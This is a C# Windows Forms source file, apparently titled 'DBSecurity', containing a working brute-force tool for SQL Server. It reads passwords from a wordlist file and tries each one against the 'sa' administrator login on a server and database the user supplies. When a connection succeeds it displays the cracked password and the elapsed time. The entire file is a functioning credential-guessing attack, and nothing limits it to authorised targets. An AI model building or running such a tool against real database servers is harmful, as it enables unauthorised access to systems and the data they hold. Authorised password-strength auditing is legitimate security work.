using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data.SqlClient;

namespace DBSecurity
{
    public partial class frmBruteForce : Form
    {
        public frmBruteForce()
        {
            InitializeComponent();
        }

        private void strtButton_Click(object sender, EventArgs e)
        {
            string cs;
            string serverName = txtServerName.Text;
            string userName = "sa";
            string dbName = txtDBName.Text;
            string password;

            int i;
            int count;
            int k = 0;
            DateTime dt = DateTime.Now;
            //int second;
            //int minute;
            //int hour;
            //int duration;

            count = Convert.ToInt32(txtCaunt.Text);

            System.IO.StreamReader sr = new System.IO.StreamReader("uniqpass_preview.txt");
            lstPassword.Items.Clear();

            for (i = 0; i<count; i++)
            {
                k++;
              
                password = sr.ReadLine();
                lblStatus.Text = password;
                lstPassword.Items.Add(password);
                Update();

                cs = "DATA SOURCE=" + serverName + ";INITIAL CATALOG=" + dbName + ";UID=" + userName + ";PASSWORD=" + password + ";CONNECT TIMEOUT=1";

                try
                {
                SqlConnection conn = new SqlConnection(cs);
                conn.Open();

                if(conn.State == ConnectionState.Open)
                {
                        DateTime dt2 = DateTime.Now;
                        TimeSpan t = dt2 - dt;
                        lblStatus.Text = "Connected! The password is " + password + " Password Count:" + i.ToString() + " Duration:" + t.ToString(@"hh\:mm\:ss");
                        return;
                }
                }
                catch (Exception)
                {
                }

            }


        }
    }
}
